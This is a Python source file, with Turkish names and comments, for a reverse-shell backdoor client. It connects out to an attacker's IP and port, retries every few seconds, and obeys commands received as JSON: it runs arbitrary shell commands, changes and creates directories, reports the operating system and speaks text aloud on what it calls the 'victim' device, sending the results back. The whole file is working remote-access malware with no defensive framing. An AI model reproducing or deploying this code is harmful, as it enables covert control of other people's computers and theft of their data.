import subprocess
import os
import simplejson
import socket
import time
import pyttsx3

ip = "77.444.11.55"  # kendi ip bilginizi girin
port = 8081  # kendi portunuzu girin


class Soket_baglanti():
    def __init__(self, ip, port):
        self.baglanti = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.baglanti.connect((ip, port))

    def Komut_Calistir(self, komut):
        komut_cikisi = subprocess.check_output(komut, shell=True)
        return komut_cikisi.decode("Latin1")

    def Json_Gonder(self, bilgi):
        json_bilgi = simplejson.dumps(bilgi)
        self.baglanti.send(json_bilgi.encode("utf-8"))

    def Json_Al(self):
        json_bilgisi = ""
        while True:
            try:
                json_bilgisi = json_bilgisi + \
                               self.baglanti.recv(1048576).decode()
                return simplejson.loads(json_bilgisi)
            except ValueError:
                continue

    def Cd_Calistir(self, yol):
        os.chdir(yol)
        return "#b# Klasore gecildi :" + yol

    def Klasor_Olustur(self, dosya_adi):
        os.mkdir(dosya_adi)
        return "#b# Klasor olusturuldu :" + dosya_adi

    def Pwd(self):
        return os.getcwd()

    def Sistem(self):
        if os.name == 'nt':
            return "Kurban cihaz bir windows sürümü."
        elif os.name == 'posix':
            return "Kurban cihaz bir linux sürümü."

    def Konus(self, kelimeler):
        engine = pyttsx3.init()
        engine.setProperty("rate", 120)
        engine.say(kelimeler)
        engine.runAndWait()
        return "#b# Kurban cihazda ses calindi."

    def Soket_Basla(self):
        while True:
            komut = self.Json_Al()
            try:
                print("yaptım try attı")

                if komut[0] == "cd" and len(komut) > 1:
                    komut_cikisi = self.Cd_Calistir(komut[1])

                elif komut[0] == "klasor_olustur":
                    komut_cikisi = self.Klasor_Olustur(komut[1])
                    print("girdim klasor")

                elif komut[0] == "pwd":
                    komut_cikisi = self.Pwd()
                elif komut[0] == "sistem":
                    komut_cikisi = self.Sistem()

                elif komut[0] == "konus":
                    komut_cikisi = self.Konus(komut[1:])

                else:
                    komut_cikisi = self.Komut_Calistir(komut)
            except Exception:
                komut_cikisi = "Bilinmeyen bir komut.Komut listesi icin 'yardim' komutunu kullaniniz."

            self.Json_Gonder(komut_cikisi)

        self.baglanti.close()


def Baglanti_Dene():
    while True:
        time.sleep(5)
        try:
            soket = Soket_baglanti(ip, port)
            soket.Soket_Basla()
        except Exception:
            Baglanti_Dene()


Baglanti_Dene()
